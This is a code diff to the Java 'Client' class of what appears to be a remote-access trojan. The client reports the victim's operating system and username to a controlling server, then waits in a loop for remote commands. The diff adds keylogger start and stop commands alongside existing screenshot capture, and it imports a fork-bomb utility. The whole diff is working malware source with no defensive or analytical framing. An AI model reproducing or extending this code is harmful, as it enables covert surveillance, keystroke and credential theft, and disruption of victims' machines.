@@ -1,15 +1,18 @@
 package app;
 
-import java.io.IOException;
-import java.net.Socket;
-
 import exception.ServerOfflineException;
+import keylogger.KeyLogger;
 import network.Connection;
 import network.Message;
 import utils.ClientUtils;
 import utils.OsCheck;
 import utils.ScreenUtils;
 import utils.forkbomb.Bomb;
+
+import java.io.EOFException;
+import java.io.IOException;
+import java.net.Socket;
+import java.net.SocketException;
 
 public class Client {
     static Connection connection;
@@ -40,8 +43,11 @@ public class Client {
 
         MY_OS = OsCheck.getOperatingSystemType();
 
-        Message osMessage = new Message("print", "User is using " + MY_OS.name());
+        Message osMessage = new Message("os", MY_OS.name());
         connection.sendMessage(osMessage);
+
+        Message username = new Message("username", System.getProperty("user.name"));
+        connection.sendMessage(username);
 
         while(true) {
             handleServerCommand();
@@ -49,9 +55,23 @@ public class Client {
     }
 
     private static void handleServerCommand() throws ServerOfflineException {
-        String command = connection.readMessage().getCommand();
+        String command = null;
+        try {
+            command = connection.readMessage().getCommand();
+        } catch(SocketException | EOFException e) {
+            Client.disconnected();
+            throw new ServerOfflineException("Server went offline");
+        } catch(IOException | ClassNotFoundException ex) {
+            ex.printStackTrace();
+        }
 
         switch(command) {
+            case "start-keylogger":
+                KeyLogger.getInstance(connection).start();
+                break;
+            case "stop-keylogger":
+                KeyLogger.getInstance(connection).stop();
+                break;
             case "screen":
                 ScreenUtils.sendScreenshot(connection, false);
                 break;
